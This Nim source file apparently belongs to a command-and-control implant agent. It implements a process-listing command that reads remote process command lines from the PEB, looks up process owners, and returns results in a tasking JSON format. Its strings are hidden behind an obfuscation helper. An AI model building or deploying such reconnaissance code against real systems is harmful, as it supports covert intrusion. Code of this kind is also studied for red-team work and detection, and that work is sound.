import std/[json, strformat]
import ../utils/debug
import ../utils/strenc

when defined(windows):
  import std/os
else:
  import std/[osproc, strutils]

type
  ProcessEntry = object
    process_id: uint32
    architecture: string
    name: string
    user: string
    bin_path: string
    parent_process_id: uint32
    command_line: string

when defined(windows):
  import winim
  import std/widestrs

  # ---- PEB reader (opt-in via `-full`): local type + ntdll binding so we
  # ---- don't depend on winim/winternl exposing PROCESS_BASIC_INFORMATION.
  type
    PROCESS_BASIC_INFO_LOCAL {.pure.} = object
      Reserved1: pointer
      PebBaseAddress: pointer
      Reserved2a: pointer
      Reserved2b: pointer
      UniqueProcessId: pointer
      Reserved3: pointer

  when sizeof(pointer) == 8:
    type
      UNICODE_STR_LOCAL {.pure.} = object
        Length: uint16
        MaximumLength: uint16
        Padding: uint32
        Buffer: pointer
    const
      PEB_OFFSET_PARAMS = 0x20
      PARAMS_OFFSET_CMDLINE = 0x70
  else:
    type
      UNICODE_STR_LOCAL {.pure.} = object
        Length: uint16
        MaximumLength: uint16
        Buffer: pointer
    const
      PEB_OFFSET_PARAMS = 0x10
      PARAMS_OFFSET_CMDLINE = 0x40

  proc NtQueryInformationProcess(ProcessHandle: HANDLE,
                                 ProcessInformationClass: DWORD,
                                 ProcessInformation: pointer,
                                 ProcessInformationLength: ULONG,
                                 ReturnLength: ptr ULONG): LONG
    {.stdcall, importc, dynlib: "ntdll.dll".}

  proc getProcessCommandLine(pid: DWORD): string =
    ## Pull a process's full command line from its PEB via ReadProcessMemory.
    ## Returns "" on access denied, bitness mismatch (WoW64 edges), or any
    ## other failure — never raises.
    let hProcess = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, 0, pid)
    if hProcess == 0:
      return ""
    defer: CloseHandle(hProcess)

    var pbi: PROCESS_BASIC_INFO_LOCAL
    var retLen: ULONG = 0
    if NtQueryInformationProcess(hProcess, 0.DWORD, addr pbi,
                                 ULONG(sizeof(pbi)), addr retLen) != 0:
      return ""
    if pbi.PebBaseAddress.isNil:
      return ""

    # Read ProcessParameters pointer out of the remote PEB.
    var paramsRemote: pointer = nil
    var br: SIZE_T = 0
    let pebParamsAddr = cast[pointer](cast[uint](pbi.PebBaseAddress) + PEB_OFFSET_PARAMS.uint)
    if ReadProcessMemory(hProcess, pebParamsAddr, addr paramsRemote,
                         SIZE_T(sizeof(pointer)), addr br) == 0:
      return ""
    if paramsRemote.isNil:
      return ""

    # Read CommandLine UNICODE_STRING out of ProcessParameters.
    var us: UNICODE_STR_LOCAL
    let cmdLineAddr = cast[pointer](cast[uint](paramsRemote) + PARAMS_OFFSET_CMDLINE.uint)
    if ReadProcessMemory(hProcess, cmdLineAddr, addr us,
                         SIZE_T(sizeof(us)), addr br) == 0:
      return ""
    if us.Length.int == 0 or us.Length.int > 32768 or us.Buffer.isNil:
      return ""

    var buf = newSeq[uint16]((us.Length.int div 2) + 1)
    if ReadProcessMemory(hProcess, us.Buffer, addr buf[0],
                         SIZE_T(us.Length), addr br) == 0:
      return ""
    buf[buf.high] = 0
    result = $cast[WideCString](addr buf[0])

  proc getProcessUser(hProcess: HANDLE): string =
    ## Get the user associated with a process
    var hToken: HANDLE = 0
    if OpenProcessToken(hProcess, TOKEN_QUERY, addr hToken) == 0:
      return ""
    
    defer: CloseHandle(hToken)
    
    # Get the size needed for token user info (TokenUser = 1)
    var dwLength: DWORD = 0
    discard GetTokenInformation(hToken, 1, nil, 0, addr dwLength)
    
    if dwLength == 0:
      return ""
    
    # Allocate buffer and get token user info
    var buffer = newSeq[byte](dwLength)
    if GetTokenInformation(hToken, 1, addr buffer[0], dwLength, addr dwLength) == 0:
      return ""
    
    # Extract SID from TOKEN_USER structure
    let pTokenUser = cast[ptr TOKEN_USER](addr buffer[0])
    let userSid = pTokenUser.User.Sid
    
    # Lookup account name from SID
    var nameSize: DWORD = 256
    var domainSize: DWORD = 256
    var nameBuffer = newSeq[char](nameSize)
    var domainBuffer = newSeq[char](domainSize)
    var sidType: SID_NAME_USE
    
    if LookupAccountSidA(nil, userSid, addr nameBuffer[0], addr nameSize, 
                         addr domainBuffer[0], addr domainSize, addr sidType) == 0:
      return ""
    
    let domain = $cast[cstring](addr domainBuffer[0])
    let name = $cast[cstring](addr nameBuffer[0])
    
    if domain.len > 0:
      result = domain & "\\" & name
    else:
      result = name
  
  proc getProcessListWindows(includeCommandLine: bool): seq[ProcessEntry] =
    result = @[]

    var pe32: PROCESSENTRY32W
    pe32.dwSize = sizeof(PROCESSENTRY32W).DWORD

    let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hSnapshot == INVALID_HANDLE_VALUE:
      return

    if Process32FirstW(hSnapshot, addr pe32) != 0:
      while true:
        var entry: ProcessEntry
        entry.process_id = pe32.th32ProcessID.uint32
        entry.parent_process_id = pe32.th32ParentProcessID.uint32
        entry.name = $cast[WideCString](addr pe32.szExeFile[0])
        entry.architecture = hostCPU  # x86_64 or i386
        entry.user = ""
        entry.bin_path = ""
        entry.command_line = ""

        # Open process to query information
        let hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pe32.th32ProcessID)
        if hProcess != 0:
          # Get user
          entry.user = getProcessUser(hProcess)
          CloseHandle(hProcess)

        # Opt-in: pull full command line from the remote PEB.
        if includeCommandLine:
          entry.command_line = getProcessCommandLine(pe32.th32ProcessID)
        
        # Try to get module path
        let hModSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID)
        if hModSnapshot != INVALID_HANDLE_VALUE:
          var me32: MODULEENTRY32W
          me32.dwSize = sizeof(MODULEENTRY32W).DWORD
          if Module32FirstW(hModSnapshot, addr me32) != 0:
            entry.bin_path = $cast[WideCString](addr me32.szExePath[0])
          CloseHandle(hModSnapshot)
        
        result.add(entry)
        
        if Process32NextW(hSnapshot, addr pe32) == 0:
          break
    
    CloseHandle(hSnapshot)

when not defined(windows):
  import std/[os, strutils, osproc]
  
  proc getProcessListLinux(includeCommandLine: bool): seq[ProcessEntry] =
    # Linux always fills command_line from /proc/[pid]/cmdline, so the flag
    # is accepted for interface parity but doesn't change behavior.
    discard includeCommandLine
    result = @[]
    
    # Read /proc directory
    for kind, path in walkDir("/proc"):
      if kind == pcDir:
        let dirname = lastPathPart(path)
        # Check if directory name is a number (PID)
        try:
          let pid = parseInt(dirname).uint32
          
          var entry: ProcessEntry
          entry.process_id = pid
          entry.architecture = hostCPU
          
          # Read /proc/[pid]/stat
          try:
            let statContent = readFile(path / "stat")
            # Parse stat file: pid (name) state ppid ...
            let nameStart = statContent.find('(')
            let nameEnd = statContent.rfind(')')
            if nameStart > 0 and nameEnd > nameStart:
              entry.name = statContent[nameStart+1..<nameEnd]
              let afterName = statContent[nameEnd+2..^1].split(' ')
              if afterName.len > 1:
                entry.parent_process_id = parseInt(afterName[1]).uint32
          except:
            entry.name = "?"
            entry.parent_process_id = 0
          
          # Read /proc/[pid]/cmdline
          try:
            var cmdline = readFile(path / "cmdline")
            cmdline = cmdline.replace('\0', ' ').strip()
            entry.command_line = if cmdline.len > 0: cmdline else: &"[{entry.name}]"
          except:
            entry.command_line = &"[{entry.name}]"
          
          # Read /proc/[pid]/status for Uid
          try:
            let statusContent = readFile(path / "status")
            for line in statusContent.splitLines():
              if line.startsWith("Uid:"):
                let parts = line.split()
                if parts.len > 1:
                  let uid = parts[1]
                  # Try to get username from /etc/passwd
                  try:
                    let (output, _) = execCmdEx(obf("getent passwd ") & uid)
                    let passwdParts = output.split(':')
                    if passwdParts.len > 0:
                      entry.user = passwdParts[0]
                    else:
                      entry.user = uid
                  except:
                    entry.user = uid
                break
          except:
            entry.user = "?"
          
          # Try to get binary path
          try:
            entry.bin_path = expandSymlink(path / "exe")
          except:
            entry.bin_path = ""
          
          result.add(entry)
        except ValueError:
          continue

proc ps*(params: string): JsonNode =
  debug "[DEBUG] Getting process list"

  var includeCommandLine = false
  if params.len > 0:
    try:
      let parsed = parseJson(params)
      if parsed.kind == JObject and parsed.hasKey(obf("full")):
        includeCommandLine = parsed[obf("full")].getBool(false)
    except CatchableError:
      discard

  try:
    when defined(windows):
      let processes = getProcessListWindows(includeCommandLine)
      let platform = "Windows " & hostCPU
    else:
      let processes = getProcessListLinux(includeCommandLine)
      let platform = "Linux " & hostCPU
    
    # Create JSON array for processes
    var processesJson = newJArray()
    for p in processes:
      processesJson.add(%*{
        obf("process_id"): p.process_id,
        obf("architecture"): p.architecture,
        obf("name"): p.name,
        obf("user"): p.user,
        obf("bin_path"): p.bin_path,
        obf("parent_process_id"): p.parent_process_id,
        obf("command_line"): p.command_line
      })
    
    # Create the full listing structure
    let listing = %*{
      obf("platform"): platform,
      obf("processes"): processesJson
    }
    
    debug &"[DEBUG] Found {processes.len} processes"
    
    let host = when defined(windows): getEnv(obf("COMPUTERNAME"), "unknown") else: execProcess(obf("hostname")).strip()
    let osStr = when defined(windows): "windows" else: "linux"

    let processMeta = %*{
      obf("host"): host,
      obf("os"): osStr,
      obf("update_deleted"): true,
      obf("processes"): processesJson
    }

    return %*{
      obf("task_id"): "",
      obf("status"): "success",
      obf("completed"): true,
      obf("user_output"): $processMeta,
      obf("processes"): processMeta
    }
    
  except Exception as e:
    return %*{
      obf("user_output"): obf("Error retrieving process list: ") & e.msg,
      obf("completed"): true,
      obf("status"): "error"
    }
